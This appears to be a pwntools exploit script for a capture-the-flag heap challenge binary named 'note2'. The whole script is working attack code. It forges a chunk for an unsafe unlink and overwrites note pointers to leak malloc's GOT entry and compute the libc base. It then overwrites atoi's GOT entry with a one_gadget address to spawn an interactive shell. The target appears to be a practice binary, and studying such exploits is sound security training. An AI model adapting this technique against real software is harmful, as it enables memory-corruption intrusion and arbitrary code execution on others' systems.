from pwn import *


def init():
    p.recvline()
    p.sendline(b"NAME")
    p.recvline()
    p.sendline(b"ADDRESS")
def new(content,size):
    p.sendlineafter(b"option--->>",b"1")
    p.sendlineafter(b"128)\n",size)
    p.sendlineafter(b"tent:\n",content)
def show(idx):
    p.sendlineafter(b"option--->>",b"2")
    p.sendlineafter(b"note:",str(idx).encode())
    p.recvuntil("Content is ")
    # print("[SHOW]: ",p.recvline())
def override(idx,content):
    p.sendlineafter(b"option--->>",b"3")
    p.sendlineafter(b"note:\n",str(idx).encode())
    p.sendlineafter(b"e/2.append]\n",b"1")
    p.sendlineafter(b"nts:",content)
    
def append(idx,content):
    p.sendlineafter(b"option--->>",b"3")
    p.sendlineafter(b"note:",str(idx).encode())
    p.sendlineafter(b"e/2.append]",b"2")
    p.sendafter(b"nts:",content)
def delete(idx):
    p.sendlineafter(b"option--->>",b"4")
    p.sendlineafter(b"note:",str(idx).encode())


env = {}
# env["LD_PRELOAD"] = "./glibc/libc.so.6"
elf = context.binary = ELF("note2")
p = process(env=env)
libc = elf.libc

ptr = 0x00602120 + 2 * 8*0



init()


payload = p64(0x0)
payload += p64(0xa0)
payload += p64(ptr - 3*8) # fd
payload += p64(ptr - 2*8) # bk
payload += p64(0x0)
new(payload,str(0x80))


new(b"1" * 16,str(0))
new(b"2" * 0x7f,str(0x80))
delete(1)
new(b"3" * 16 + p64(0xa0) + p64(0x90),str(0))
delete(2)


override(0, b"A" * 8*3 + p64(0x602128)  )
override(0, p64(elf.got["malloc"])  )
show(1)


leak = p.recvline().strip(b"\x0a")
print(len(leak))
leak = u64(leak + b"\x00"*(8-len(leak)))
libc.address = leak - libc.sym["malloc"]
print(hex(libc.address))


# 0x4525a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv
# 
# 0xef9f4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv
# 
# 0xf0897 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
ONE_SHOT = libc.address  + 0xf0897

print(hex(ONE_SHOT))

override(0,p64(elf.got["atoi"]))
override(1,p64(ONE_SHOT))

p.sendline("\n")
p.interactive()